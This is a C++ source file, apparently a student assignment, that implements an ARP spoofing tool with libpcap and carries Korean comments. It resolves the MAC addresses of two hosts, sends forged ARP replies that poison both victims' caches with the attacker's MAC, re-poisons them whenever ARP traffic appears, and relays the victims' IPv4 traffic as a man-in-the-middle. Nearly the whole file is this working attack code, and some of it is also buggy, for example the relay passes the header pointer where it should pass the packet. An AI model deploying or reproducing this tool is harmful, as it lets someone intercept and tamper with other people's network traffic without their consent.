#include "functions.h"

using namespace std;

struct ether_packet
{
    Mac     ether_dhost;
    Mac     ether_shost;
    uint16_t    ether_type;   
    uint8_t     eth_payload[1500];
};

void usage() {
	printf("syntax : arp-spoof <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {

	if (argc / 2 == 1) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	char myIp[40];
	map<uint32_t, Mac> senderTable;
	map<uint32_t, Mac> targetTable;
	Mac sender_mac;
	Mac target_mac;
	getMyIpAddr(myIp, dev);

	for(int i = 2 ; i < argc ; i += 2){
		if(senderTable.find(Ip(argv[i])) == senderTable.end()){
			printf("%d %s %x\n", i, argv[i], htonl(Ip(argv[i])));
			senderTable.insert(pair<uint32_t, Mac>(htonl((uint32_t)Ip(argv[i])), Mac()));
		}
	}

	for(int i = 3 ; i < argc ; i += 2){
		if(targetTable.find(Ip(argv[i])) == targetTable.end()){
			printf("%d %s %x\n", i, argv[i], htonl(Ip(argv[i])));
			targetTable.insert(pair<Ip, Mac>(Ip(argv[i]),Mac()));
		}
	}

	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	for(int ip = 2 ; ip < argc ; ip += 2){	

		/* Sender의 Mac 주소를 획득 */ 
		EthArpPacket requestPacket = setArpPacket(ArpHdr::Request, 
		Ip(myIp), Ip(argv[ip]),  			//sender ip, target ip
		Mac("ff:ff:ff:ff:ff:ff"),  	//dmac 
		Mac(getMyMacAddr()),		//smac
		Mac(getMyMacAddr()),		//sender mac
		Mac("00:00:00:00:00:00"));	//target mac

		int res_send = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&requestPacket), sizeof(EthArpPacket));
		if (res_send != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res_send, pcap_geterr(handle));
		}

		struct pcap_pkthdr* header;
		const u_char* packet;
		/* ARP 응답 패킷을 받기 위함 */
		while (true) {
			int res = pcap_next_ex(handle, &header, &packet);
			if (res == 0) continue;
			if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
				printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
				break;
			}
			
			/* 이더넷 패킷 확인 */ 
			EthArpPacket* arp;
			arp = (EthArpPacket*)packet;
			if(ntohs(arp->eth_.type_) == ETHERTYPE_ARP){
				
				/* ARP 패킷 확인 */	
				uint32_t senderIp = htonl((uint32_t)arp->arp_.sip_);
				char sipStr[33];
            	sprintf(sipStr, "%d.%d.%d.%d",
					(senderIp & 0xff000000) >> 3 * 8,
					(senderIp & 0xff0000) >> 2 * 8,
					(senderIp & 0xff00) >> 1 * 8,
					(senderIp & 0xff));

				/* Source IP와 Sender IP 비교 */
				if(strncmp(sipStr, argv[ip], strlen(argv[ip])) == 0){
					sender_mac = arp->arp_.smac_;
					senderTable[arp->arp_.sip_] = sender_mac;
					break;
				} 
			}
		}

		/* Sender의 Mac 주소를 획득 */ 
		EthArpPacket requestPacket_t = setArpPacket(ArpHdr::Request, 
		Ip(myIp), Ip(argv[ip + 1]),  			//sender ip, target ip
		Mac("ff:ff:ff:ff:ff:ff"),  	//dmac 
		Mac(getMyMacAddr()),		//smac
		Mac(getMyMacAddr()),		//sender mac
		Mac("00:00:00:00:00:00"));	//target mac

		int res_send2 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&requestPacket_t), sizeof(EthArpPacket));
		if (res_send2 != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res_send2, pcap_geterr(handle));
		}

		struct pcap_pkthdr* header_t;
		const u_char* packet_t;
		/* ARP 응답 패킷을 받기 위함 */
		while (true) {
			int res = pcap_next_ex(handle, &header_t, &packet_t);
			if (res == 0) continue;
			if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
				printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
				break;
			}
			
			/* 이더넷 패킷 확인 */ 
			EthArpPacket* arp;
			arp = (EthArpPacket*)packet;
			if(ntohs(arp->eth_.type_) == ETHERTYPE_ARP){
				
				/* ARP 패킷 확인 */	
				uint32_t senderIp = htonl((uint32_t)arp->arp_.sip_);
				char sipStr[33];
            	sprintf(sipStr, "%d.%d.%d.%d",
					(senderIp & 0xff000000) >> 3 * 8,
					(senderIp & 0xff0000) >> 2 * 8,
					(senderIp & 0xff00) >> 1 * 8,
					(senderIp & 0xff));

				/* Source IP와 Sender IP 비교 */
				if(strncmp(sipStr, argv[ip + 1], strlen(argv[ip + 1])) == 0){
				
					target_mac = arp->arp_.smac_;
					targetTable[arp->arp_.sip_] = target_mac;
					break;
				} 
			}
		}

		sleep(1);

		/* ARP Attack */
		EthArpPacket replyPacket = setArpPacket(ArpHdr::Reply, 
			Ip(argv[ip + 1]), Ip(argv[ip]), 		//sender ip, target ip
			sender_mac,						//dmac 
			Mac(getMyMacAddr()), 			//smac 
			Mac(getMyMacAddr()), 			//sender mac -> 게이트웨이의 IP와 나의 Mac 주소를 보냄
			sender_mac);					//target mac

		int res_send3 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&replyPacket), sizeof(EthArpPacket));
		if (res_send3 != 0) {
			fprintf(stderr, "pcap_sendpacket_3 return %d error=%s\n", res_send3, pcap_geterr(handle));
			break;
		}
		/* ARP Attack */
		EthArpPacket replyPacket2 = setArpPacket(ArpHdr::Reply, 
			Ip(argv[ip]), Ip(argv[ip + 1]), 		//sender ip, target ip
			target_mac,						//dmac 
			Mac(getMyMacAddr()), 			//smac 
			Mac(getMyMacAddr()), 			//sender mac -> 게이트웨이의 IP와 나의 Mac 주소를 보냄
			target_mac);					//target mac

		int res_send4 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&replyPacket2), sizeof(EthArpPacket));
		if (res_send4 != 0) {
			fprintf(stderr, "pcap_sendpacket_4 return %d error=%s\n", res_send4, pcap_geterr(handle));
			break;
		}
	}

	struct pcap_pkthdr* header_relay;
	const u_char* packet_relay;
	puts("relay start");
	while (true) {
		
		int res = pcap_next_ex(handle, &header_relay, &packet_relay);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}
		
		/* 이더넷 패킷 확인 */ 
		EthHdr* pkt;
		pkt = (EthHdr*)packet_relay;
		/* ARP reAttack */
		if(EthHdr::Arp == pkt->type()){
			puts("ARP Packet Detect");
			EthArpPacket* arp;

			arp = (EthArpPacket*)packet_relay;
			/* ARP reAttack */
			EthArpPacket replyPacket = setArpPacket(ArpHdr::Reply, 
				arp->arp_.tip_, arp->arp_.sip_,		//sender ip, target ip
				sender_mac,						//dmac 
				Mac(getMyMacAddr()), 			//smac 
				Mac(getMyMacAddr()), 			//sender mac -> 게이트웨이의 IP와 나의 Mac 주소를 보냄
				sender_mac);					//target mac

			int res_send3 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&replyPacket), sizeof(EthArpPacket));
			if (res_send3 != 0) {
				fprintf(stderr, "pcap_sendpacket_3 return %d error=%s\n", res_send3, pcap_geterr(handle));
				break;
			}

			/* ARP reAttack */
			EthArpPacket replyPacket2 = setArpPacket(ArpHdr::Reply, 
				arp->arp_.sip_, arp->arp_.tip_, 		//sender ip, target ip
				target_mac,						//dmac 
				Mac(getMyMacAddr()), 			//smac 
				Mac(getMyMacAddr()), 			//sender mac -> 게이트웨이의 IP와 나의 Mac 주소를 보냄
				target_mac);					//target mac

			int res_send4 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&replyPacket2), sizeof(EthArpPacket));
			if (res_send4 != 0) {
				fprintf(stderr, "pcap_sendpacket_4 return %d error=%s\n", res_send4, pcap_geterr(handle));
				break;
			}
		}
		else{
			if(EthHdr::Ip4 != pkt->type()) continue;

			if (pkt->smac_ == sender_mac) {
				printf("detected\n");
				pkt->smac_ = Mac(getMyMacAddr());
				pkt->dmac_ = target_mac;
				int res_relay = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&header_relay), header_relay->caplen);

			}

			if(pkt->smac_ == target_mac){
				printf("detected\n");
				pkt->smac_ = Mac(getMyMacAddr());
				pkt->dmac_ = sender_mac;

				int res_relay = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&header_relay), header_relay->caplen);
			}
		}
	}

	pcap_close(handle);
}
